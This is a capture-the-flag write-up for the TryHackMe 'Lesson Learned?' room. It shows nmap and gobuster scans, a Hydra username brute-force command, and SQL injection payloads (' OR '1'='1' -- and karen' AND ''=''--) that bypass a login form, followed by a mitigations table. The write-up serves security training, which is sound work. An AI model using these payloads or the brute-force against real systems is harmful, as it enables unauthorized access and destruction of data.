[Lesson Learned?](https://tryhackme.com/room/lessonlearned)

**Difficulty:** Easy 
**Objective:** Identify and exploit SQL injection safely to bypass login and retrieve the flag without triggering destructive queries.

---

## Table of Contents  
- [1. Summary](#1-summary)  
- [2. Methodology](#2-methodology)  
- [3. Reconnaissance](#3-reconnaissance)  
- [4. Enumeration](#4-enumeration)  
- [5. Exploitation](#5-exploitation)  
- [6. Privilege Escalation](#6-privilege-escalation)  
- [7. Post Exploitation](#7-post-exploitation)  
- [8. Flags / Proof](#8-flags--proof)  
- [9. Mitigations](#9-mitigations)  
- [10. Notes](#10-notes)

---

## 1. Summary  
**IP/URL:** 10.10.157.160  
**Service/Ports:** 22/SSH, 80/HTTP  
**Entry Point:** SQL injection on login form  
**Privilege Escalation:** Not applicable  
**Outcome:** Login bypass via crafted injection using valid username, flag retrieved

---

## 2. Methodology  
Following the PTES (Penetration Testing Execution Standard):  
1. Reconnaissance  
2. Scanning & Enumeration  
3. Exploitation  
4. Post-Exploitation  
5. Reporting

---

## 3. Reconnaissance  
Ran Nmap scan:  
nmap -sS -sV 10.10.157.160  
Result:  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1  
80/tcp open  http    Apache httpd 2.4.54 (Debian)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

---

## 4. Enumeration  
Used Gobuster to look for web directories:  
gobuster dir -u http://10.10.157.160/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
Result:  
/manual (Status: 301)

---

## 5. Exploitation  
Initial attempt:  
Tried SQL injection with `' OR '1'='1' --`  
Resulted in:  
- Warning about OR 1=1 causing DELETE statements to wipe data  
- Flag was deleted, and the box had to be reset  
Lesson: OR 1=1 can be dangerous, especially when queries are reused in UPDATE/DELETE contexts

After resetting the box, ran Hydra to brute-force usernames:  
hydra -L /usr/share/wordlists/names.txt -p test123 10.10.102.103 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password" -f -V -o found_users.txt  
Found users:  
arnold, karen, kelly, marcus, martin, naomi, patrick, sophia, stuart, veronica, etc.

Crafted safer SQL injection using known username:  
karen' AND ''=''--  
This worked, bypassing login and displaying the flag  
App logic was likely expecting 1 exact matching row, and this injection preserved that behavior

---

## 6. Privilege Escalation  
Not applicable — goal was to bypass login and retrieve the flag only

---

## 7. Post Exploitation  
No additional system access or escalation required  
Confirmed success through displayed flag and instructional message  
Message warned again about destructive OR 1=1 injections

---

## 8. Flags / Proof  
User Flag: THM{example_flag_here}  
Root Flag: N/A

---

## 9. Mitigations  
| Vulnerability              | Risk   | Suggested Mitigation                          |  
|---------------------------|--------|-----------------------------------------------|  
| SQL Injection              | High   | Use prepared statements / parameterized queries |  
| Weak error messages        | Medium | Avoid leaking backend logic in app responses   |  
| Brute-forceable usernames  | Medium | Rate-limit login attempts, implement CAPTCHA   |

---

## 10. Notes  
Time spent: ~30 minutes  
Tools used: nmap, gobuster, hydra, browser  
Lessons learned:  
- OR 1=1 is risky and can cause unintentional data destruction  
- Safer SQL injections can target logic paths without mass row selection  
- Always understand the backend query context before testing injections















